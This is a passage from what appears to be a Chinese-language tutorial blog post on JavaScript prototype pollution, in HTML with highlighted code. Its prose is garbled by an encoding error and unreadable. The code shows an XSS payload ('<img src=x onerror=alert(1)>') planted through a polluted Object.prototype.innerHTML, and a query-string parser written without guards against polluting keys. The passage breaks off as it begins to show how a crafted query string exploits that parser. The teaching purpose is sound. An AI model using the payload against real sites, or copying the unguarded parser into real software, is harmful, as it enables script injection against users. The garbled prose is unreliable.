æ‰€æŒ‡å‘çš„æ±è¥¿ï¼Œå°±æ˜¯ JS å¼•æ“åœ¨ str èº«ä¸Šæ‰¾ä¸åˆ°æ±è¥¿æ™‚ï¼Œæ‡‰è©²å»çš„ã€Œä¸Šä¸€å±¤ã€ï¼Œè€Œé€™å€‹ä¸Šä¸€å±¤æœƒæ˜¯ <code>String.prototype</code>ã€‚</p>\n<p>é€™è§£é‡‹äº†ç‚ºä»€éº¼ MDN ä¸Šé¢ä¸å¯« repeatï¼Œè€Œæ˜¯å¯« <code>String.prototype.repeat</code>ï¼Œå› ç‚ºé€™æ‰æ˜¯ repeat function çš„å…¨åï¼Œé€™å€‹ repeat å‡½å¼å…¶å¯¦æ˜¯å­˜åœ¨æ–¼ <code>String.prototype</code> é€™å€‹ç‰©ä»¶ä¸Šçš„ä¸€å€‹æ–¹æ³•ã€‚</p>\n<p>å› æ­¤ï¼Œç•¶ä½ åœ¨å‘¼å« <code>str.repeat</code> çš„æ™‚å€™ï¼Œå…¶å¯¦å°±æ˜¯åœ¨å‘¼å« <code>String.prototype.repeat</code>ï¼Œè€Œé€™å°±æ˜¯åŸå‹éˆçš„åŸç†è·Ÿé‹ä½œæ–¹å¼ã€‚</p>\n<p>é™¤äº†å­—ä¸²ä»¥å¤–ï¼Œå…¶ä»–æ±è¥¿ä¹Ÿæ˜¯ä¸€æ¨£çš„ï¼Œä¾‹å¦‚èªªç‰©ä»¶ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// undefined</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>toString<span class=\"token punctuation\">)</span> <span class=\"token comment\">// Æ’ toString() { [native code] }</span></code></pre>\n<p>æ˜æ˜ obj å°±æ˜¯ä¸€å€‹ç©ºç‰©ä»¶ï¼Œç‚ºä»€éº¼ <code>obj.toString</code> æœ‰æ±è¥¿ï¼Ÿå› ç‚º JS å¼•æ“åœ¨ obj æ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥å°±å» <code>obj.__proto__</code> æ‰¾ï¼Œè€Œé€™å€‹ <code>obj.__proto__</code> æ‰€æŒ‡å‘çš„åœ°æ–¹æ˜¯ <code>Object.prototype</code>ï¼Œæ‰€ä»¥ <code>obj.toString</code> æœ€å¾Œæ‰¾åˆ°çš„å…¶å¯¦æ˜¯ <code>Object.prototype.toString</code>ã€‚</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>toString <span class=\"token operator\">===</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>toString<span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></code></pre>\n<h2 id=\"%E6%94%B9%E8%AE%8A%E9%A0%90%E8%A8%AD-prototype-%E4%B8%8A%E7%9A%84%E5%B1%AC%E6%80%A7\"><a class=\"direct-link\" href=\"#%E6%94%B9%E8%AE%8A%E9%A0%90%E8%A8%AD-prototype-%E4%B8%8A%E7%9A%84%E5%B1%AC%E6%80%A7\">#</a> æ”¹è®Šé è¨­ prototype ä¸Šçš„å±¬æ€§</h2>\n<p>å­—ä¸²çš„ <code>__proto__</code> æœƒæ˜¯ <code>String.prototype</code>ï¼Œæ•¸å­—çš„ <code>__proto__</code> æœƒæ˜¯ <code>Number.prototype</code>ï¼Œè€Œé™£åˆ—çš„å‰‡æ˜¯ <code>Array.prototype</code>ï¼Œé€™äº›é—œè¯éƒ½æ˜¯å·²ç¶“é è¨­å¥½çš„äº†ï¼ŒåŸå› å°±æ˜¯è¦è®“é€™äº›é¡åˆ¥çš„æ±è¥¿å¯ä»¥å…±ç”¨åŒä¸€å€‹ functionã€‚</p>\n<p>å¦‚æœæ¯ä¸€å€‹å­—ä¸²éƒ½æœ‰è‡ªå·±çš„ <code>repeat</code>ï¼Œé‚£ä¸€ç™¾è¬å€‹å­—ä¸²å°±æœ‰ä¸€ç™¾è¬å€‹ä¸åŒçš„ repeatï¼Œä½†å…¶å¯¦åšçš„äº‹æƒ…éƒ½ä¸€æ¨£ï¼Œè½èµ·ä¾†ä¸å¤ªåˆç†å°å§ï¼Ÿæ‰€ä»¥é€é prototype ï¼Œæˆ‘å€‘å°±å¯ä»¥æŠŠ <code>repeat</code> æ”¾åœ¨ <code>String.prototype</code>ï¼Œé€™æ¨£æ¯å€‹å­—ä¸²åœ¨ä½¿ç”¨é€™å€‹å‡½å¼æ™‚ï¼Œå‘¼å«åˆ°çš„éƒ½æœƒæ˜¯åŒä¸€å€‹å‡½å¼ã€‚</p>\n<p>ä½ å¯èƒ½æœƒå¥½å¥‡èªªï¼Œæ—¢ç„¶å‘¼å«åˆ°çš„æ˜¯åŒå€‹å‡½å¼ï¼Œåƒæ•¸ä¹Ÿéƒ½ä¸€æ¨£ï¼Œé‚£å‡½å¼è¦æ€éº¼å€åˆ†å‡ºæ˜¯ä¸åŒçš„å­—ä¸²åœ¨å‘¼å«å®ƒï¼Ÿ</p>\n<p>ç­”æ¡ˆå°±æ˜¯ï¼šthisï¼Œåº•ä¸‹ç›´æ¥çœ‹å€‹ä¾‹å­ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">first</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><br><span class=\"token punctuation\">}</span><br><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">first</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// undefined</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"abc\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">first</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// a</span></code></pre>\n<p>é¦–å…ˆï¼Œæˆ‘åœ¨ <code>String.prototype</code> ä¸Šé¢åŠ äº†ä¸€å€‹æ–¹æ³•å«åš <code>first</code>ï¼Œæ‰€ä»¥ç•¶æˆ‘å‘¼å« <code>&quot;&quot;.first</code> çš„æ™‚å€™ï¼ŒJS å¼•æ“æ²¿è‘— <code>__proto__</code> æ‰¾åˆ°äº† <code>String.prototype</code>ï¼Œç™¼ç¾äº† <code>String.prototype.first</code> æ˜¯å­˜åœ¨çš„ï¼Œå°±å‘¼å«äº†é€™å€‹å‡½å¼ã€‚</p>\n<p>è€Œåˆå› ç‚º this çš„è¦å‰‡ï¼Œç•¶ <code>&quot;&quot;.first()</code> é€™æ¨£å¯«çš„æ™‚å€™ï¼Œåœ¨ <code>first</code> ä¸­æ‹¿åˆ°çš„ this æœƒæ˜¯ <code>&quot;&quot;</code>ï¼›è‹¥å‘¼å«çš„æ˜¯ <code>&quot;abc&quot;.first()</code>ï¼Œ<code>first</code> ä¸­æ‹¿åˆ°çš„ this å°±æœƒæ˜¯ <code>&quot;abc&quot;</code>ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥ç”¨ this ä¾†å€åˆ†ç¾åœ¨æ˜¯èª°åœ¨å‘¼å«ã€‚</p>\n<p>åƒä¸Šé¢é‚£æ¨£ <code>String.prototype.first</code> çš„å¯«æ³•ï¼Œå°±æ˜¯ç›´æ¥å»ä¿®æ”¹ String çš„åŸå‹ï¼ŒåŠ ä¸Šä¸€å€‹æ–°çš„æ–¹æ³•ï¼Œè®“æ‰€æœ‰å­—ä¸²éƒ½å¯ä»¥ç”¨åˆ°é€™å€‹æ–°çš„ methodã€‚é›–ç„¶å¾ˆæ–¹ä¾¿æ²’éŒ¯ï¼Œä½†æ˜¯é€™æ¨£çš„æ–¹å¼åœ¨é–‹ç™¼ä¸Šæ˜¯ä¸è¢«æ¨è–¦çš„ï¼Œæœ‰ä¸€å¥è©±æ˜¯é€™æ¨£èªªçš„ï¼š<a href=\"https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/\">Don't modify objects you don't own</a>ã€‚ä¾‹å¦‚èªª MooTools å°±å› ç‚ºåšäº†é¡ä¼¼çš„äº‹æƒ…ï¼Œå°è‡´ä¸€å€‹ array çš„ method è¦æ›åç¨±ï¼Œè©³æƒ…è«‹çœ‹æˆ‘ä»¥å‰å¯«éçš„ï¼š<a href=\"https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/\">Donâ€™t break the Webï¼šä»¥ SmooshGate ä»¥åŠ <keygen> ç‚ºä¾‹</a>ã€‚</p>\n<p>ç„¶å¾Œï¼Œæ—¢ç„¶ <code>String.prototype</code> å¯ä»¥ä¿®æ”¹ï¼Œé‚£ç†æ‰€ç•¶ç„¶ <code>Object.prototype</code> ä¹Ÿå¯ä»¥ä¿®æ”¹ï¼Œåƒæ˜¯é€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">123</span><br><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 123</span></code></pre>\n<p>å› ç‚ºä¿®æ”¹äº† <code>Object.prototype</code> çš„ç·£æ•…ï¼Œæ‰€ä»¥åœ¨å­˜å– <code>obj.a</code> çš„æ™‚å€™ï¼ŒJS å¼•æ“åœ¨ obj èº«ä¸Šæ‰¾ä¸åˆ° a é€™å€‹å±¬æ€§ï¼Œæ–¼æ˜¯å» <code>obj.__proto__</code> ä¹Ÿå°±æ˜¯ <code>Object.prototype</code> æ‰¾ï¼Œåœ¨é‚£ä¸Šé¢æ‰¾åˆ°äº† aï¼Œæ–¼æ˜¯å°±å›å‚³é€™å€‹ a çš„å€¼ã€‚</p>\n<p>ç•¶ç¨‹å¼å‡ºç¾æ¼æ´ï¼Œå°è‡´å¯ä»¥è¢«æ”»æ“Šè€…æ‹¿å»æ”¹è®ŠåŸå‹éˆä¸Šçš„å±¬æ€§ï¼Œå°±å«åš prototype pollutionã€‚Pollution æ˜¯æ±¡æŸ“çš„æ„æ€ï¼Œå°±åƒä¸Šé¢é€™å€‹ object çš„ä¾‹å­ï¼Œæˆ‘å€‘é€é <code>Object.prototype.a = 123</code> ã€Œæ±¡æŸ“ã€äº†ç‰©ä»¶åŸå‹ä¸Šçš„ <code>a</code> é€™å€‹å±¬æ€§ï¼Œå°è‡´ç¨‹å¼åœ¨å­˜å–ç‰©ä»¶æ™‚ï¼Œæœ‰å¯èƒ½å‡ºç¾æ„æƒ³ä¸åˆ°çš„è¡Œç‚ºã€‚</p>\n<p>é‚£é€™æœƒé€ æˆä»€éº¼å¾Œæœå‘¢ï¼Ÿ</p>\n<h2 id=\"%E6%B1%A1%E6%9F%93%E4%BA%86%E5%B1%AC%E6%80%A7%E4%BB%A5%E5%BE%8C%E5%8F%AF%E4%BB%A5%E5%B9%B9%E5%98%9B%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E6%B1%A1%E6%9F%93%E4%BA%86%E5%B1%AC%E6%80%A7%E4%BB%A5%E5%BE%8C%E5%8F%AF%E4%BB%A5%E5%B9%B9%E5%98%9B%EF%BC%9F\">#</a> æ±¡æŸ“äº†å±¬æ€§ä»¥å¾Œå¯ä»¥å¹¹å˜›ï¼Ÿ</h2>\n<p>å‡è¨­ä»Šå¤©ç¶²ç«™ä¸Šæœ‰å€‹æœå°‹åŠŸèƒ½ï¼Œæœƒå¾ query string è£¡é¢æ‹¿ <code>q</code> çš„å€¼ï¼Œç„¶å¾Œå¯«åˆ°ç•«é¢ä¸Šå»ï¼Œå‘ˆç¾å‡ºä¾†åƒæ˜¯é€™æ¨£ï¼š</p>\n<p><img src=\"/img/posts/huli/prototype-pollution/2-search.png\" alt=\"search\"></p>\n<p>è€Œæ•´æ®µç¨‹å¼ç¢¼æ˜¯é€™æ¨£å¯«çš„ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// å¾ç¶²å€åˆ—ä¸Šæ‹¿åˆ° query string</span><br><span class=\"token keyword\">var</span> qs <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// æ”¾ä¸Šç•«é¢ï¼Œç‚ºäº†é¿å… XSS ç”¨ innerText</span><br>document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>  tag<span class=\"token operator\">:</span> <span class=\"token string\">'h2'</span><span class=\"token punctuation\">,</span><br>  innerText<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Search result for </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>qs<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// ç°¡åŒ–å»ºç«‹å…ƒä»¶ç”¨çš„å‡½å¼</span><br><span class=\"token keyword\">function</span> <span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">config</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> element <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>tag<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>innerHTML<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    element<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>innerHTML<br>  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    element<span class=\"token punctuation\">.</span>innerText <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>innerText<br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span> element<br><span class=\"token punctuation\">}</span></code></pre>\n<p>ä¸Šé¢é€™æ®µç¨‹å¼ç¢¼æ‡‰è©²æ²’ä»€éº¼å•é¡Œå°å§ï¼Ÿæˆ‘å€‘å¯«äº†ä¸€å€‹ function <code>createElement</code> å¹«æˆ‘å€‘ç°¡åŒ–ä¸€äº›æ­¥é©Ÿï¼Œæ ¹æ“šå‚³é€²ä¾†çš„ config æ±ºå®šè¦ç”¢ç”Ÿä»€éº¼å…ƒä»¶ã€‚ç‚ºäº†é¿å… XSSï¼Œæ‰€ä»¥æˆ‘å€‘ç”¨ <code>innerText</code> è€Œä¸æ˜¯ <code>innerHTML</code>ï¼Œè¬ç„¡ä¸€å¤±ï¼Œçµ•å°ä¸æœƒæœ‰ XSSï¼</p>\n<p>çœ‹èµ·ä¾†æ˜¯é€™æ¨£æ²’éŒ¯ï¼Œä½†å¦‚æœåœ¨åŸ·è¡Œåˆ°é€™ä¸€æ®µç¨‹å¼ç¢¼ä»¥å‰æœ‰å€‹ prototype pollution çš„æ¼æ´ï¼Œèƒ½è®“æ”»æ“Šè€…æ±¡æŸ“åˆ°åŸå‹ä¸Šçš„å±¬æ€§å‘¢ï¼Ÿä¾‹å¦‚èªªåƒæ˜¯é€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// å…ˆå‡è¨­å¯ä»¥æ±¡æŸ“åŸå‹ä¸Šçš„å±¬æ€§</span><br><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;img src=x onerror=alert(1)>'</span><br><br><span class=\"token comment\">// åº•ä¸‹éƒ½è·Ÿå‰›å‰›ä¸€æ¨£</span><br><span class=\"token keyword\">var</span> qs <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URLSearchParams</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>  tag<span class=\"token operator\">:</span> <span class=\"token string\">'h2'</span><span class=\"token punctuation\">,</span><br>  innerText<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Search result for </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>qs<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">function</span> <span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">config</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> element <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>tag<span class=\"token punctuation\">)</span><br>  <span class=\"token comment\">// é€™ä¸€è¡Œå› ç‚ºåŸå‹éˆè¢«æ±¡æŸ“ï¼Œæ‰€ä»¥ if(config.innerHTML) çš„çµæœæœƒæ˜¯ true</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>innerHTML<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    element<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>innerHTML<br>  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    element<span class=\"token punctuation\">.</span>innerText <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>innerText<br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span> element<br><span class=\"token punctuation\">}</span></code></pre>\n<p>æ•´ä»½ç¨‹å¼ç¢¼åªå·®åœ¨é–‹é ­ï¼Œå¤šäº†ä¸€å€‹ <code>Object.prototype.innerHTML = '&lt;img src=x onerror=alert(1)&gt;'</code>ï¼Œè€Œå°±å› ç‚ºé€™ä¸€è¡Œæ±¡æŸ“äº† innerHTMLï¼Œå°è‡´åº•ä¸‹ <code>if (config.innerHTML) {</code> çš„åˆ¤æ–·è®Šæˆ trueï¼Œè¡Œç‚ºè¢«æ”¹è®Šï¼ŒåŸæœ¬æ˜¯ç”¨ <code>innerText</code>ï¼Œç¾åœ¨æ”¹æˆç”¨ <code>innerHTML</code>ï¼Œæœ€å¾Œå°±é”æˆäº† XSSï¼</p>\n<p>é€™å°±æ˜¯ç”± prototype pollution æ‰€å¼•ç™¼çš„ XSS æ”»æ“Šã€‚ä¸€èˆ¬ä¾†èªªï¼Œprototype pollution æŒ‡çš„æ˜¯ç¨‹å¼æœ‰æ¼æ´ï¼Œå°è‡´æ”»æ“Šè€…å¯ä»¥æ±¡æŸ“åŸå‹éˆä¸Šçš„å±¬æ€§ï¼Œä½†æ˜¯é™¤äº†æ±¡æŸ“ä»¥å¤–ï¼Œé‚„å¿…é ˆæ‰¾åˆ°å¯ä»¥å½±éŸ¿çš„åœ°æ–¹ï¼ŒåŠ åœ¨ä¸€èµ·æ‰èƒ½å½¢æˆå®Œæ•´çš„æ”»æ“Šã€‚</p>\n<p>æ­¤æ™‚çš„ä½ æ‡‰è©²å¾ˆå¥½å¥‡ï¼Œé‚£åˆ°åº•æ€æ¨£çš„ç¨‹å¼ç¢¼æœƒæœ‰æ¼æ´ï¼Œå±…ç„¶èƒ½è®“æ”»æ“Šè€…å»æ”¹åŸå‹éˆä¸Šçš„å±¬æ€§ã€‚</p>\n<h2 id=\"prototype-pollution-%E6%98%AF%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\"><a class=\"direct-link\" href=\"#prototype-pollution-%E6%98%AF%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\">#</a> Prototype pollution æ˜¯æ€éº¼ç™¼ç”Ÿçš„ï¼Ÿ</h2>\n<p>æœ‰å…©å€‹ä¾‹å­å¾ˆå¸¸ç™¼ç”Ÿé€™ç¨®äº‹æƒ…ï¼Œç¬¬ä¸€å€‹æ˜¯è§£æ query stringã€‚</p>\n<p>ä½ å¯èƒ½æƒ³èªª query string ä¸å°± <code>?a=1&amp;b=2</code> é€™ç¨®é¡å‹ï¼Œæœ‰ä»€éº¼é›£çš„ï¼Ÿä½†å…¶å¯¦è¨±å¤šå‡½å¼åº«çš„ query string éƒ½æœ‰æ”¯æ´é™£åˆ—ï¼Œåƒæ˜¯ <code>?a=1&amp;a=2</code> æˆ–æ˜¯ <code>?a[]=1&amp;a[]=2</code> éƒ½æœ‰å¯èƒ½è¢«è§£æç‚ºé™£åˆ—ã€‚</p>\n<p>é™¤äº†é™£åˆ—ä»¥å¤–ï¼Œæœ‰äº›ç”šè‡³é‚„æ”¯æ´ç‰©ä»¶ï¼Œåƒæ˜¯é€™æ¨£ï¼š<code>?a[b][c]=1</code>ï¼Œå°±æœƒç”¢ç”Ÿä¸€å€‹ <code>{a: {b: {c: 1}}}</code> çš„ç‰©ä»¶å‡ºä¾†ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œ<a href=\"https://github.com/ljharb/qs#parsing-objects\">qs</a> é€™å€‹ library å°±æœ‰æ”¯æ´ç‰©ä»¶çš„è§£æã€‚</p>\n<p>ä»Šå¤©å¦‚æœæ˜¯ä½ è¦ä¾†è² è²¬é€™å€‹åŠŸèƒ½ï¼Œä½ æœƒæ€éº¼å¯«å‘¢ï¼Ÿæˆ‘å€‘å¯ä»¥å¯«ä¸€å€‹åªé‡å°ç‰©ä»¶çš„é™½æ˜¥ç‰ˆæœ¬ï¼ˆå…ˆä¸è€ƒæ…® URL encode çš„æƒ…æ³ï¼Œä¹Ÿä¸è€ƒæ…®é™£åˆ—ï¼‰ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">parseQs</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">qs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">let</span> arr <span class=\"token operator\">=</span> qs<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&amp;'</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> item <span class=\"token keyword\">of</span> arr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>key<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token comment\">// é‡å°ä¸€èˆ¬çš„ key=value</span><br>      result<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> value<br>      <span class=\"token keyword\">continue</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token comment\">// é‡å°ç‰©ä»¶</span><br>    <span class=\"token keyword\">let</span> items <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">'['</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">let</span> obj <span class=\"token operator\">=</span> result<br>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> items<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token keyword\">let</span> objKey <span class=\"token operator\">=</span> items<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">]$</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">===</span> items<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        obj<span class=\"token punctuation\">[</span>objKey<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> value<br>      <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> obj<span class=\"token punctuation\">[</span>objKey<span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token string\">'object'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>          obj<span class=\"token punctuation\">[</span>objKey<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>        obj <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">[</span>objKey<span class=\"token punctuation\">]</span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span> result<br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> qs <span class=\"token operator\">=</span> <span class=\"token function\">parseQs</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test=1&amp;a[b][c]=2'</span><span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>qs<span class=\"token punctuation\">)</span><br><span class=\"token comment\">// { test: '1', a: { b: { c: '2' } } }</span></code></pre>\n<p>åŸºæœ¬ä¸Šå°±æ˜¯æ ¹æ“š <code>[]</code> è£¡é¢çš„å…§å®¹å»æ§‹é€ å‡ºä¸€å€‹ç‰©ä»¶ï¼Œä¸€å±¤ä¸€å±¤å»è³¦å€¼ï¼Œçœ‹èµ·ä¾†æ²’ä»€éº¼ç‰¹åˆ¥çš„ã€‚</p>\n<p>ä½†æ˜¯ï¼å¦‚æœæˆ‘çš„ query string 